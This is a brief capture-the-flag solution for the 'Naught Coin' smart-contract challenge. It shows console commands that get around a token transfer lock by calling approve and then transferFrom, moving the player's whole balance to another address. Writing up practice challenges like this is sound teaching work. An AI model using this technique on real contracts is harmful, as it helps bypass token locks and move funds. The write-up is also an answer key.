# Naught Coin solution

1. Check current player balance  
`web3.fromWei(await contract.balanceOf(player))`  
"1000000"  

2. The contract puts locks only on the `transfer` method, but ignores the `approve` and `transferFrom` methods. Let's approve the player to transfer the funds.
`await contract.approve(player, web3.toWei(1000000))`  

3. Now we can use `transferFrom` to transfer funds to some address.
`await contract.transferFrom(player, 0x1, web3.toWei(1000000))`

4. Check player's current balance
`web3.fromWei(await contract.balanceOf(player))`  
"0"  

5. Submit instance 🎉   
